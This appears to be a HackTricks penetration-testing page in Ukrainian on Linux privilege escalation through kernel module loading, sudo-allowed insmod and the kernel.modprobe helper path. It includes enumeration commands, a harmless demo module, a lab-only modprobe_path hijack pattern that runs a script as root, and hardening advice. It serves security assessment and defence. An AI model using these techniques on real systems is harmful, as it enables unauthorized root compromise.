# Зловживання Kernel Modules і modprobe

{{#include ../../banners/hacktricks-training.md}}

## Неправильні конфігурації kernel module і завантаження модулів

Підтримка kernel modules є важливою областю під час перевірки ескалації привілеїв у Linux. Не вважайте кожне повідомлення про unsigned module самостійно експлуатованим, але використовуйте його, щоб отримати відповіді на практичні запитання:

- Чи може поточний користувач завантажувати модулі через `sudo`, capabilities або writable helper path?
- Чи все ще ввімкнене завантаження модулів?
- Чи вимкнене enforcement підписів модулів?
- Чи доступні для запису директорії модулів або файли модулів?
- Чи можна читати kernel logs, щоб підтвердити, що сталося?

Швидкий triage:
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
cat /proc/sys/kernel/module_sig_enforce 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
Тлумачення:

- `modules_disabled=1` означає, що нові модулі не можна завантажувати до перезавантаження.
- `module_sig_enforce=1` зазвичай блокує модулі без підпису.
- `dmesg_restrict=0` дає непривілейованим користувачам змогу читати журнали ядра в багатьох системах.
- Доступні для запису шляхи в `/lib/modules/$(uname -r)/` небезпечні, оскільки пошук і автоматичне завантаження модулів можуть довіряти цьому дереву.

### Завантаження модуля та читання виводу ядра

Якщо ви маєте законний дозвіл на завантаження локального модуля, `insmod` вставляє саме вказаний вами файл `.ko`. Функція ініціалізації модуля виконується негайно, а повідомлення, записані за допомогою `printk()`, з’являються в журналах ядра.

Мінімальний робочий процес для середовищ перевірки або лабораторій:
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
Якщо `sudo -l` дозволяє виконувати `insmod`, `modprobe` або обгортку над ними, вважайте це критичною проблемою:
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### Дозволений через `sudo` `insmod`

Правило `sudo`, яке дозволяє користувачу запускати `insmod`, не можна порівнювати з дозволом на використання звичайного адміністративного helper-а. Код ініціалізації модуля виконується в kernel context одразу після вставлення `.ko`, тому практичне питання під час перевірки таке: «чи може цей користувач вибрати або змінити модуль, який завантажується?»

Загальний порядок перевірки:
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
Якщо користувач може надати довільний `.ko`, під час авторизованої оцінки це правило слід розглядати як повну компрометацію системи. Безпечніший операційний підхід — не делегувати завантаження модулів через sudo; якщо це неминуче, обмежте точний шлях, власника, дозволи, політику підписування та процедуру видалення.

Для нешкідливого підходу до збирання модуля в контрольованій лабораторії мінімальні вихідний код і Makefile мають такий вигляд:
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
Збирайте та завантажуйте лише в авторизованій лабораторії:
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### Перевірки зловживання `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` керує userspace helper, який kernel викликає, коли йому потрібна допомога із завантаженням модулів. Якщо attacker може змінити його на шлях до executable, доступного для запису, і викликати невідомий формат binary або інший шлях запиту модуля, це може призвести до виконання коду з правами root.

Перевірте поточний helper:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
Перевірте, чи можете ви вплинути на нього:
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
Загальний шаблон лише для лабораторного середовища:
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger an unknown executable format so the kernel attempts helper logic
printf '\\xff\\xff\\xff\\xff' > /tmp/unknown
chmod +x /tmp/unknown
/tmp/unknown 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
На захищених системах це має завершуватися помилкою, оскільки непривілейовані користувачі не можуть записувати до `kernel.modprobe`, шлях до helper не доступний для запису або шляхи завантаження модулів заблоковані.

### Перевірка доступності `/lib/modules` для запису

Доступні для запису каталоги модулів можуть дозволити заміну модулів, розміщення шкідливих модулів або зловживання auto-load — залежно від того, як надалі викликається `modprobe`.

Перевірте доступні для запису розташування:
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
Якщо ви знайдете вміст модуля, доступний для запису, перевірте, як виявляються модулі:
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
Захисні рекомендації:

- Залишайте `/lib/modules` у власності `root:root` і недоступним для запису користувачам.
- Встановлюйте `kernel.modules_disabled=1` після завантаження системи, якщо це можливо з операційної точки зору.
- Забезпечте перевірку підписів модулів у системах, яким потрібні модулі, що завантажуються.
- Відстежуйте записи до `/proc/sys/kernel/modprobe`, `/lib/modules`, а також неочікуване виконання `insmod`/`modprobe`.
